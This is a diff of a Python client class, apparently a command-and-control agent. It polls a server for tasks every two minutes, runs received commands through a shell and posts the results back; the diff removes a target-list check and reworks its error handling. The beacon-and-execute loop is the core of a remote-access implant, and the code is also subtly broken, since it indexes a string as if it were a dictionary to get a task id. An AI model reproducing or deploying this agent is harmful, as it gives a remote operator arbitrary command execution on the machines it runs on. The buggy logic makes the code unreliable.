@@ -32,32 +32,32 @@ class Client:
         except:
             print("Failed to register agent (" + self.local_ip + ")")
         while True:
-            req = requests.get(f"http://{self.server_ip}:{self.port}/targets")
-            print(req.text)
-            targets = req.text.split("\n")
-            if self.local_ip in targets:
-                print("Agent is in the target list")
-                try:
-                    req = requests.get(f"http://{self.server_ip}:{self.port}/tasks")
-                    print(req.json())
-                    task = req.json().get('action')
-                    print(task)
-                    if task == "command":
-                        command = req.json().get('command')
-                        ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
-                        data = {'agent_id':self.local_ip,'task_id': task['task_id'], 'result': 'NULL','returncode': ps.returncode}
-                        req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
-                    elif task == "download":
-                        pass
-                    elif task == "upload":
-                        pass
-                    else:
-                        raise ValueError("Invalid task type")
-                except subprocess.CalledProcessError as e:
-                    data = {'task_id': task['task_id'], 'result': e.stderr,'returncode': e.returncode}
+            try:
+                req = requests.get(f"http://{self.server_ip}:{self.port}/tasks")
+                print(req.json())
+                if req.status_code not in [200, 201]:
+                    raise ValueError("Failed to get tasks")
+                if req.text == "NULL":
+                    time.sleep(120)
+                    continue
+                task = req.json().get('action')
+                print(task)
+                if task == "command":
+                    command = req.json().get('command')
+                    ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
+                    data = {'agent_id':self.local_ip,'task_id': task['task_id'], 'result': 'NULL','returncode': ps.returncode}
                     req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
-                except Exception as e:
-                    print(e)
+                elif task == "download":
+                    pass
+                elif task == "upload":
+                    pass
+                else:
+                    raise ValueError("Invalid task type")
+            except subprocess.CalledProcessError as e:
+                data = {'task_id': task['task_id'], 'result': e.stderr,'returncode': e.returncode}
+                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
+            except Exception as e:
+                print(e)
             time.sleep(120)
 
 def main():
